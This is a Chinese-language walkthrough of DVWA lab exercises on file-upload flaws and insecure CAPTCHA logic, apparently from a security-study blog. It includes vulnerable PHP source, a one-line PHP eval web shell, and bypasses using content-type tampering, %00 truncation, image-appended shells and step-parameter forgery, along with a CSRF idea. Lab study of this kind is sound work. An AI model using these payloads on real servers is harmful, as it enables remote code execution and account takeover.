<h1 id="File-Upload-文件上传"><a href="#File-Upload-文件上传" class="headerlink" title="File Upload (文件上传)"></a>File Upload (文件上传)</h1><h2 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-15"><a href="#源码-15" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">    <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// No</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Yes!</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>basename(path,suffix)</code> 函数返回路径中的文件名部分，如果可选参数 <code>suffix</code> 为空，则返回的文件名含后缀名，反之不包含后缀名。</p>
<p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p>
<h3 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>上传漏洞利用的条件是，成功上传木马文件，上传的文件必须能被执行，上传的路径必须可知。</p>
<p>构造木马文件 <code>hack.php</code></p>
<figure class="highlight php"><figcaption><span>hack.php</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hacker&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上传成功返回路径 <code>../../hackable/uploads/hack.php</code> 。</p>
<p>使用浏览器访问 <code>http://dvwa.local/vulnerabilities/upload/../../hackable/uploads/hack.php</code> 没有报错显示为空白。</p>
<p>使用菜刀连接 <code>http://dvwa.local/vulnerabilities/upload/../../hackable/uploads/hack.php</code> 参数名 : <code>hacker</code> 。</p>
<h2 id="Medium-4"><a href="#Medium-4" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/jpeg&quot;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&quot;image/png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>限制文件类型必须是 <code>jpeg</code> 或 <code>png</code> 大小不能超过 <code>100000B</code> (约<code>97.6KB</code>)。</p>
<h3 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
<li>文件包含与文件上传组合</li>
</ul>
<p>直接将 <code>hack.php</code> 命名为 <code>hack.jpg</code> 文件，将其上传后，利用文件包含漏洞可解析执行 <code>jpg</code> 文件内的指令，使用菜刀连接(脚本类型选PHP)。</p>
<ul>
<li>Burp Suite Pro 改包</li>
</ul>
<p>无文件包含漏洞，将 <code>hack.php</code> &gt;&gt; <code>hack.jpg</code> &gt;&gt; 上传 &gt;&gt; Burp Suite Pro 抓包 &gt;&gt; <code>hack.jpg</code> 改为 <code>hack.php</code> &gt;&gt; <code>Forward</code> &gt;&gt; 获得返回地址 &gt;&gt; 菜刀获取webshell。</p>
<ul>
<li>截断绕过</li>
</ul>
<p>服务器的 php 版本小于 <code>5.3.4</code> ， <code>Magic_quote_gpc</code> 为 <code>off</code> 时文件名可使用 <code>%00</code> 截断，将文件命名为 <code>hack.php%00.png</code> 上传，由于被 <code>%00</code> 截断，服务器保存的文件为 <code>hack.php</code> 获取返回地址菜刀获取webshell。</p>
<h2 id="High-4"><a href="#High-4" class="headerlink" title="High"></a>High</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= basename( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !move_uploaded_file( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>strrpos(string,find,start)</code> 函数返回字符串 <code>find</code> 在另一字符串 <code>string</code> 中最后一次出现的位置，若没找到支付串则返回 <code>false</code> 可选参数 <code>start</code> 规定搜索开始点。</p>
<p><code>getimagesize(string filename)</code> 函数通过读取文件头，返回图片的长、宽等信息，如果没有相关图片文件头，函数报错。</p>
<p>通过限制文件名 <code>.</code> 后面的字符串，限制了文件的类型，文件必须是 <code>.jpg</code> 、<code>.jpeg</code> 、<code>.png</code> 之一，同时使用 <code>getimagessize</code> 函数限制了文件头必须为图像类型。</p>
<h3 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用 <code>copy</code> 命令将 <code>hack.php</code> 与图片文件 <code>image.jpg</code> 合并。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">copy image.jpg/b+hack.php/a shell.jpg</span><br></pre></td></tr></table></figure>
<p>用记事本打开生成的文件 <code>shell.jpg</code> 可看到末尾加入了 <code>hack.php</code> 内的内容。</p>
<p>也可用记事本打开 <code>image.jpg</code> 直接复制 <code>hack.php</code> 文件内容到 <code>image.jpg</code> 的末尾。</p>
<p>将生成的文件直接上传即可。</p>
<h2 id="Impossible-4"><a href="#Impossible-4" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = substr( <span class="variable">$uploaded_name</span>, strrpos( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;type&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&#x27;hackable/uploads/&#x27;</span>;</span><br><span class="line">    <span class="comment">//$target_file   = basename( $uploaded_name, &#x27;.&#x27; . $uploaded_ext ) . &#x27;-&#x27;;</span></span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) == <span class="string">&#x27;&#x27;</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">&#x27;upload_tmp_dir&#x27;</span> ) ) );</span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$uploaded_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;jpeg&#x27;</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">&#x27;png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> || <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/png&#x27;</span> ) &amp;&amp;</span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD)</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">&#x27;image/jpeg&#x27;</span> ) &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> );</span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy( <span class="variable">$img</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the web root from the temp folder?</span></span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;a href=&#x27;$&#123;target_path&#125;$&#123;target_file&#125;&#x27;&gt;$&#123;target_file&#125;&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete any temp files</span></span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) )</span><br><span class="line">            unlink( <span class="variable">$temp_file</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>imagecreatefromjpeg(filename)</code> 函数返回图片文件的图像标识，失败返回false。</p>
<p><code>imagejpeg(image,filename,quality)</code> 从 <code>image</code> 图像以 <code>filename</code> 为文件名创建一个 JPEG 图像，可选参数 <code>quality</code> 范围从 <code>0</code> (最差质量，文件更小)到 <code>100</code> (质量最佳，文件最大)。</p>
<p><code>imagedestroy(img)</code> 函数销毁图像资源。</p>
<p>该等级对上传的文件进行了重命名(为md5值)，加入 <code>Anti-CSRF token</code> 防护 CSRF 攻击，同时对文件的内容进行了严格的检查。</p>
<p>文件上传与文件包含: 文件包含是指调用文件，可调用本地的文件，也可调用远程的文件;文件上传是指上传一个文件，如果上传木马，上传后往往需要调用执行，因此，文件上传与文件包含经常会打组合拳。</p>
<h1 id="Insecure-CAPTCHA-不安全的验证码-不安全的验证过程"><a href="#Insecure-CAPTCHA-不安全的验证码-不安全的验证过程" class="headerlink" title="Insecure CAPTCHA (不安全的验证码/不安全的验证过程)"></a>Insecure CAPTCHA (不安全的验证码/不安全的验证过程)</h1><p>reCAPTCHA 验证流程 : 模块验证码由 Google 提供 reCAPTCHA 服务;用户向 Google 发送请求验证码模块的js &gt;&gt; Google 返回验证码 &gt;&gt; 用户发送输入的验证码到网站服务器 &gt;&gt; 网站服务器向 Google 验证用户输入的正确性 &gt;&gt; Google 返回验证结果。</p>
<p>服务器通过调用 <code>recaptcha_check_answer</code> 函数检查用户输入的正确性。</p>
<p>由于是绕过验证码，无需科学上网环境。</p>
<h2 id="Low-5"><a href="#Low-5" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-19"><a href="#源码-19" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = recaptcha_check_answer(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>给密码分两步: </p>
<ul>
<li>检查用户输入的验证码，验证通过后，服务器返回表单</li>
<li>客户端提交 <code>post</code> 请求，服务器完成更改密码操作。</li>
</ul>
<p>其中存在明显逻辑漏洞，服务器仅通过检查 <code>Change</code> 、<code>step</code> 来判断用户是否已经输入了正确的验证码。 </p>
<h2 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><strong>ps:</strong> 由于没有科学上网，发送的请求包中没有 reCAPTCHA 的相关参数。</p>
<ul>
<li><p>Burp Suite Pro 抓包 &gt;&gt; 修改 <code>step=1</code> 为 <code>step=2</code> &gt;&gt; <code>Forward</code></p>
</li>
<li><p>没有防 CSRF 机制，可构造攻击页面,受害者访问这个页面时，攻击脚本会伪造改密请求发送给服务器，但当密码修改成功后，服务器会返回 302 实现自动跳转更改密码成功界面，使受害者意识到自己被攻击了。</p>
</li>
</ul>
